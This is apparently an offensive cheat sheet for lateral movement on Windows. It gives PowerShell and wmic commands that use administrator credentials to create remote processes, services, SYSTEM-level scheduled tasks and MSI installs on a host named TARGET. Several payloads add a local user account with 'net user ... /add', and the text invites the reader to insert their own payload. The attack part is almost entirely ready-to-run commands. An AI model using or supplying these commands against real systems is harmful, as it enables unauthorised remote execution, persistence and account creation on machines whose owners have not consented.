## 1: Connect to WMI through Powershell

#### 1) 

    $username= 'Administrator';
#### 2) 

    $password= 'PASSWORD';
#### 3) 

    $securepassword = ConvertTo-SecureString $password -AsPlaintext -Force;
#### 4) 

    $credential = New-Object System.Management.Automation.PSCredential $username, $securepassword;

## 2: Establish WMI Session

### Protocols:

### 1) DCOM: RPC over IP. Ports: 135/TCP, 49152-65535/TCP

### 2) Wsman: WinRM. Ports: 5985/TCP (WinRM HTTP), 5986/TCP (WinRM HTTPS) 

## 3: WMI Through Powershell

#### 1) 

    $Opt = New-CimSessionOption -Protocol DCOM

#### 2) 

    $Session = New-CimSession -ComputerName TARGET -Credential $credential -sessionOption $Opt -ErrorAction Stop

## 4: Remote Process Creation (WMI)

### Ports: 135/TCP, 49152-65535/TCP, 5986/TCP, 5986/TCP

### Group Memberships: Administrators

#### 1) 

    $Command = "powershell.exe -Command Set-Content -Path C:\text.txt -Value jimmywsahere";

####  2) 

    Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $Command}

### Legacy Systems

#### 

    wmic.exe /user:Administrator /password:PASSWORD /node:TARGET process call create "cmd.exe /c calc.exe"

## 5: Remote Service Creation (WMI)

### Ports: 135/TCP, 49152-65535/TCP (DCERPC) 5985/TCP or 5986/TCP

### Group Memberships: Administrators

#### 1) 

    Invoke-CimMethod -CimSession $session -ClassName Win32Service -MethodName Create -Arguments @{Name = "service"; DisplayName = "service"; PathName = "net user USER PASSWORD /ADD" (INSERT YOUR PAYLOAD HERE) ServiceType = [byte]::parse("16"); (Win32OwnProcess: Start service in a new process) StartMode = "Manual"}

## 6: Get handle on service and start

#### 

    $service = Get-CimInstance -CimSession $session -ClassName Win32_Service -filter "Name LIKE 'service'"

#### 

    Invoke-CimMethod -InputObject $service -MethodName StartService

#### 

    Invoke-CimMethod -InputObject $service -MethodName StopService

#### 

    Invoke-CimMethod -InputObject $service -MethodName Delete

## 7: Remote scheduled tasks creation (WMI)

### Ports: 135/TCP, 49152-65535/TCP, 5985/TCP or 5986/TCP

### Group Memberships: Administrators

## *Payload must be split in Command and Args*

#### 

    $Command = "cmd.exe"

#### 

    $Args = "/c net user USER PASSWORD /add"

#### 

    $Action = New-ScheduledTaskAction -CimSession $Session -Execute $Command -Argument $Args

#### 

    Register-ScheduledTask -CimSession $Session -Action $Action -User "NT AUTHORITY\SYSTEM" - TaskName "task"

#### 

    Start-ScheduledTask -CimSession $Session -TaskName "task"

#### 

    Unregister-ScheduledTask -CimSession $Session -TaskName "task"

## 8: MSI Packages (WMI)

### Ports:  135/TCP, 49152-65535/TCP, 5985/TCP or 5986/TCP

### Group Memberships: Administrators

#### 

    Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\myinstaller.msi"; Options = ""; AllUsers = $false}

### Legacy Systems

#### 

    wmic /node:TARGET /user:DOMAIN\USER product call install PackageLocation=c:\windows\myinstaller.msi
